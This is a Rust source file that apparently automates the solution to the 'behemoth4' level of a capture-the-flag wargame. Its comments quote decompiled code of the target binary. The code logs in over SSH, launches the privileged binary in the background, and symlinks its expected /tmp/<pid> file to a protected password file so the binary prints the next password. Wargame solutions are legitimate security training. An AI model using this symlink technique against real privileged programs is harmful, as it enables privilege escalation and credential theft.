use crate::util::*;
use anyhow::Result;

/// behemoth4 attempts to read a file in tmp with the name of its pid
/// the code from ghidra is a bit like:
///   _Var1 = getpid();
///   sprintf(local_28,"/tmp/%d",_Var1);
///   __stream = fopen(local_28,"r");
///   if (__stream == (FILE *)0x0) {
///       puts("PID not found!");
///   }
///   else {
///       sleep(1);
///       puts("Finished sleeping, fgetcing");
///       while( true ) {
///       __c = fgetc(__stream);
///       if (__c == -1) break;
///       putchar(__c);
///       }
///       fclose(__stream);
///   }
/// technique is to start the process, get its pid, and in parellel create a link to the next password file to be read
pub fn solve(password: &str) -> Result<String> {
    
    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "behemoth4", password)?;
    ssh.read_until("$ ")?;

    println!("creating a tmp folder and moving to it");
    ssh.write_line("cd $(mktemp -d)")?;
    ssh.read_until("$ ")?;

    println!("starting process in background");
    ssh.write_line(
        "bash -c 'echo $$ > test.pid && sleep 2 && exec /behemoth/behemoth4 > res.txt' &",
    )?;
    ssh.read_until("$ ")?;

    println!("creating symlink");
    ssh.write_line(
        "ln -s /etc/behemoth_pass/behemoth5 /tmp/$(cat test.pid)",
    )?;
    ssh.read_until("$ ")?;

    println!("waiting for result");
    std::thread::sleep(std::time::Duration::from_secs(3));

    ssh.write_line("cat res.txt")?;
    let result = ssh.read_until("$ ")?;
    let result = result
        .split("\n")
        .map(|s| s.trim())
        .find(|s| s.len() == 10)
        .unwrap();
    println!("retrieved behemoth5 pass '{result}'\n");

    Ok(result.to_string())
}
